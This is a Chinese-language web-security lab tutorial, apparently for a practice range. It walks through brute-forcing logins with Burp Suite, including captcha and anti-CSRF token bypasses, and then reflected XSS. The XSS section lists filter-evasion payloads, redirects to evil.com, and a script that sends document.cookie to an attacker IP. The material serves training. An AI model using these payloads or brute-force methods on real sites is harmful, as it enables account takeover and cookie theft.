---
typora-copy-images-to: 图片
typora-root-url: ./
---

# 一、暴力破解

Burte Force（暴力破解）概述

​             “暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。         

​             理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。这里的认证安全策略, 包括：

​              1.是否要求用户设置复杂的密码；
​             2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；
​             3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；
​             4.是否采用了双因素认证；
​             ...等等。

## 1、基于表单的暴力破解

a、提交数据

![1568213840918](/图片/1568213840918.png)

b、抓包进行爆破

![1568215095203](/图片/1568215095203.png)

![1568215114930](/图片/1568215114930.png)

c、看响应数据包长度

![1568215188316](/图片/1568215188316.png)

d、爆出密码为123456

![1568215234863](/图片/1568215234863.png)

## 2、验证码绕过(on server)

a、bursuite拦截发送到repeater,多次发送请求发现验证码可以重复使用。

![1568618135365](/图片/1568618135365.png)

b、使用发送到intruder添加paload进行爆破

![1568618273695](/图片/1568618273695.png)

![1568618313203](/图片/1568618313203.png)

3、爆破成功

![1568618412054](/图片/1568618412054.png)

## 3、验证码绕过(on client)

前端绕过是最不可靠的，使用bursuit抓包可以随意修改请求数据，绕过前端限制。

a、直接抓包，有了这个请求包后，验证码是可以不需要的

![1568618656858](/图片/1568618656858.png)

b、扔到intruder爆破：

![1568619024697](/图片/1568619024697.png)

![1568619012983](/图片/1568619012983.png)

c、爆出账户密码

![1568619093940](/图片/1568619093940.png)

## 4、token防爆破?

每次请求后token都是会改变的，这是否就意味着不可爆破？实际上我们是可以获取token的，把token加进paload进行密码爆破。

a、首先抓包扔到intruder，配置positions

![1568624869473](/图片/1568624869473.png)

b、点击Options,设置线程为1

![1568625168055](/图片/1568625168055.png)

添加Grep-Extract

![1568625201767](/图片/1568625201767.png)

指定token并复制下来，点击ok保存

![1568625270482](/图片/1568625270482.png)

![1568625405872](/图片/1568625405872.png)

redirections设置为always

![1568625419009](/图片/1568625419009.png)

c、接下来设置payloads

![1568625531546](/图片/1568625531546.png)

payload2为token,b把之前复制的token填入initial payload里面

![1568625574535](/图片/1568625574535.png)

d、开始爆破，爆破成功

![1568625717579](/图片/1568625717579.png)

# 二、Cross-Site Scripting

​		Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写"CSS"冲突，故又称XSS。一般XSS可以分为如下几种常见类型：
​         1.反射性XSS;
​          2.存储型XSS;
​          3.DOM型XSS;
​          XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。
​            因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:
​            输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;
​            输出转义：根据输出点的位置对输出到前端的内容进行适当转义。
​          对于过滤，我们会通过各种方法去绕过:

​           前端过滤绕过：抓包拦截改包

​           大小写绕过：<ScipT>alert(/xss/)</SCipt>

​            双写绕过：<scr<script>ipt>alert(/xss/)</s</script>cript>

​            注释干扰：<sc<!--content-->ript>alert(/xss/)</scr<!--content-->ipt>

​            编码绕过：依据前端编码解码机制

## 1、反射型xss(get)

### 1）漏洞验证：

页面只有一个输入框并设置了长度限制，随便输入一个字符，并在页面上返回字符，在message参数直接提交payload:<script>alert(1)</script>。

![1568704670690](/图片/1568704670690.png)

其他一些有趣的payload:

<a href=""  onclick=alert("xss")>type<a>
<img src='' onerror=alert("xss")>

<script>window.location='http://1.1.1.1'</script＞
<script>document.location.href="http://www.evil.com"</script>
<iframe src="http://1.1.1.1/victim" height = "0" width = "0"></iframe>
<srcipt>new.Image.src="192.168.1.104/c.php?output="+document.cookie</script>
<script>document.body.innerHTML="<div stytle=visibility:visible;><h1>THIS WEBSITE IS UNDER ATTACK</h1>"</script>

### 2)代码分析

服务器获取用户通过get提交过来的message,没有过滤就通过字符串拼接赋值给html，并且没有做任何编码处理就打印出来。

![1568717795251](/图片/1568717795251.png)

![1568717963826](/图片/1568717963826.png)

### 3）漏洞利用

#### a、窃取cookie



## 2、反射性xss(post)

